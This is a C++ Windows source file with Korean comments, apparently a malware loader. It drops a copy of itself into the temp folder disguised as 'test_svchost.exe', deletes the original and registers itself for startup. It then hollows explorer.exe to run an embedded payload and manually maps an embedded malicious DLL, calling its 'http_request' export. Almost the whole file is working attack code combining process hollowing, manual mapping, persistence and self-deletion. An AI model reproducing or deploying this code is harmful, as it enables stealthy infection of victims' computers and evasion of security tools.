#include <stdio.h>
#include <windows.h>
#include <iostream>
#include "process_.h"
#include "File_Injector.h"
#include "PE_FILE.h"
#include "dropper.h"
#include "autorun.h"


#pragma comment(lib, "ntdll.lib")


//unsigned char DLL_RawData[2142720] = {0x40, ... ... } -> .\Attack_File 내 있는 manual_mapping_dll.cpp 파일의 raw 데이터, 실행 전 dll 파일의 raw 데이터를 저장하는 과정이 필요함.


WCHAR wszProcessPath[] = L"explorer.exe";
typedef void(*WorkerFunctionCall)();


PBYTE LoadResourceFile(LPCWSTR resourceName, SIZE_T& resourceSize) {
	HMODULE hModule = GetModuleHandle(NULL); // 모듈핸들구하기
	if (hModule == NULL) {
		return NULL;
	}

	HRSRC hResource = FindResource(hModule, resourceName, RT_RCDATA); //현재 프로세스(null) 를 만드는데 사용되는 모듈을 검색, 지정된 리소스의 정보블록에대한 핸들
	if (hResource == NULL) {
		return NULL;
	}

	HGLOBAL hLoadedResource = LoadResource(hModule, hResource); //리소스 핸들 구하기
	if (hLoadedResource == NULL) {
		return NULL;
	}

	PBYTE pResourceData = (PBYTE)LockResource(hLoadedResource);// 리소스 데이터 획득(포인터)
	resourceSize = SizeofResource(hModule, hResource);

	return pResourceData;
}

void Process_Hollowing(PBYTE peBuffer, SIZE_T peSize)
{
	process explorer_Process; //프로세스 클래스 초기화
	BOOL create_status = explorer_Process.create(wszProcessPath, true); // supended, 프로세스 생성, 일시중지 스레드 콘텍스트 가져오기 ,PEB구조체 포인터 획득, 이미지 베이스 PEB를 토앻 획득,

	if (create_status)
	{
		ULONG_PTR target_imagebase = explorer_Process.imagebase();//이미지 베이스 리턴

		if (explorer_Process.unmap(target_imagebase)) //  NtunMapviewofSection api를 통하여 정상 타겟 프로세스의 실행 파일 섹션을 해제
		{
			File_Injector injector(explorer_Process.handle());// 인젝터 데이터 초기화, EXPLORER 프로세스 핸들 전달

			PE_FILE malware_pefile(peBuffer, peSize); // 악성코드 를 토대로 현재프로세스내 메모리 할당및 쓰기(0 으로초기화후 쓰기), 헤더정보 초기화, 
			ULONG malware_pefile_Size = malware_pefile.imageSize();//NTHeader->OptionalHeader.SizeOfImage

			ULONG_PTR target_Addr = injector.alloc(malware_pefile_Size, target_imagebase); // 타겟프로세스(EXPLORER)내 UNMAP 됐던 메모리에 악성코드 사이즈 만큼 메모리 할당, Write 되진 않음
			LONG_PTR relativeOffset = 0;

			if (target_Addr != 0)
			{
				ULONG_PTR TempAddr = malware_pefile.memAlloc(malware_pefile_Size); // 현재 프로세스내 임시 메모리 할당(0으로 초기화)

				relativeOffset = malware_pefile.Get_Relative_Offset(target_Addr); // 타겟 프로세스의 이미지 베이스에서 현재 프로세스의 이미지 베이스 차이 구함
				malware_pefile.Set_Imagebase(target_Addr);// 현재프로세스  이미지베이스를 타겟 이미지 베이스로 초기화 

				injector.writeHeader(TempAddr, (ULONG_PTR)malware_pefile.peHeader(), malware_pefile.peHeaderSize()); // 현재 프로세스내 임시 메모리에 이전에 현재 프로세스에 작성된 악성코드를 작성(헤더만)
				ULONG_PTR currentSection = malware_pefile.Get_FirstSection(); //악성코드 파일의 첫번쨰 섹션 획득,
				for (int nSection = 0; nSection < malware_pefile.numberOfSection(); ++nSection)// 섹션수 만큼 반복
				{
					injector.writeSection(TempAddr, (ULONG_PTR)malware_pefile.peHeader(), currentSection); // 임시 메모리에 섹션 데이터를 작성, 악성코드의 섹션부분 주소를 읽어와 작성, 
					currentSection = malware_pefile.Get_NextSection(currentSection);// 악성코드의 다음 섹션주소획득
				}

				malware_pefile.relocate(TempAddr, relativeOffset); // 현재프로세스 저장된 악성코드의 재배치 디렉터리를 기반으로 임시 메모리 재배치수행, 타겟 프로세스 이미지베이스의 차(relativeOffset)를 각 재배치 주소에 더함

				injector.WriteVirtualMemory(target_Addr, TempAddr, malware_pefile_Size);//타겟 프로세스에 재할당 주소까지 마친 임시메모리 데이터 작성,
				explorer_Process.patchEntryPoint(target_Addr, malware_pefile.addressOfEntryPoint());//타겟 프로세스(EXPLORER)에 악성코드 실행파일 전체를 로드 했으니 해당 악성코드의 엔트리 포인트를 더하여 패치해야함
				explorer_Process.resume(); //시작
			}

		}
	}
}

void DLL_Manual_Mapping()
{
	File_Injector injector; // null 시 자기 프로세스 GetCurrentProcess

	PE_FILE malware_dll(DLL_RawData, sizeof(DLL_RawData));//저장된 코드 이용
	ULONG malware_dllSize = malware_dll.imageSize(); //dll 이미지 크기 구함

	ULONG_PTR TargetAddress = injector.alloc(malware_dllSize, NULL);// NULL -> 자기 자신 할당
	LONG_PTR relative_Offset = 0;
	if (TargetAddress != 0)
	{
		ULONG_PTR TempAddr = malware_dll.memAlloc(malware_dllSize); // 현재프로세스 임시메모리 생성
		
		if (TempAddr != 0)
		{
			relative_Offset = malware_dll.Get_Relative_Offset(TargetAddress); // 현재 프로세스에 작성될 주소와 악성 dll 파일과의 이미지베이스 차 구함
			malware_dll.Set_Imagebase(TargetAddress); // 악성dll 의 이미지베이스를 작성될 주소의 이미지 베이스로 설정

			injector.writeHeader(TempAddr, (ULONG_PTR)malware_dll.peHeader(), malware_dll.peHeaderSize()); // 임시 메모리 내 악성 dll작성

			ULONG_PTR currentSection = malware_dll.Get_FirstSection(); //섹션획득
			for (int nSection = 0; nSection < malware_dll.numberOfSection(); ++nSection)
			{
				injector.writeSection(TempAddr, (ULONG_PTR)malware_dll.peHeader(), currentSection);// 섹션 작성
				currentSection = malware_dll.Get_NextSection(currentSection);
			}
			malware_dll.resolveIAT(TempAddr);// 악성DLL 파일을 기반으로 DLL(모듈) 정보를 읽어와 임시메모리에 작성된 악성코드의 IAT 테이블을 INT 테이블을 참고로 하여 리졸빙

			malware_dll.relocate(TempAddr, relative_Offset);//임시메모리의 악성DLL을 재배치 + 타겟 주소의 차 만큼 더하여 재배치 

			injector.WriteVirtualMemory(TargetAddress, TempAddr, malware_dllSize); // 타겟 주소에 임시 메모리 데이터 작성

			injector.callEntryPoint(TargetAddress, malware_dll.addressOfEntryPoint()); // 타겟주소의 엔트리 포인트 재지정 

			WorkerFunctionCall ulFuncionAddress = (WorkerFunctionCall)malware_dll.getAddress((HMODULE)TargetAddress, (char*)"http_request");// DLL의 http_request 함수를 읽어옴 DLL이므로 EXPORT 디렉터리내 해당함수를 찾음
			{
				ulFuncionAddress();
			}
		}
	}
}
void dropper_Func()
{
	Dropper dropper;

	std::wstring tempPath;
	std::wstring exePath;
	std::wstring tempExePath;

	dropper.GetTemp_Path(tempPath);
	dropper.GetCurrentExePath(exePath);

	tempExePath = tempPath + L"\\test_svchost.exe";

	if (dropper.CopyExeToTemp(exePath, tempExePath)) {
		dropper.RunTempExe(tempExePath);
		dropper.DeleteCurrentExe();
	}
}

int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	PSTR LpCmdLine,
	INT nCmdShow
)
{
	int argc;
	wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	SIZE_T peSize = 0;
	//argc > 1 && wcscmp(argv[1], L"-copy") == 0
	if (argc > 1 && wcscmp(argv[1], L"-copy") == 0) {
		LocalFree(argv);
		AddToStartup();
		PBYTE peBuffer = LoadResourceFile(MAKEINTRESOURCE(101), peSize);
		Process_Hollowing(peBuffer, peSize);

		Sleep(10000);
		DLL_Manual_Mapping();

		return 0;
	}

	dropper_Func();
	LocalFree(argv);


	return 0;
}
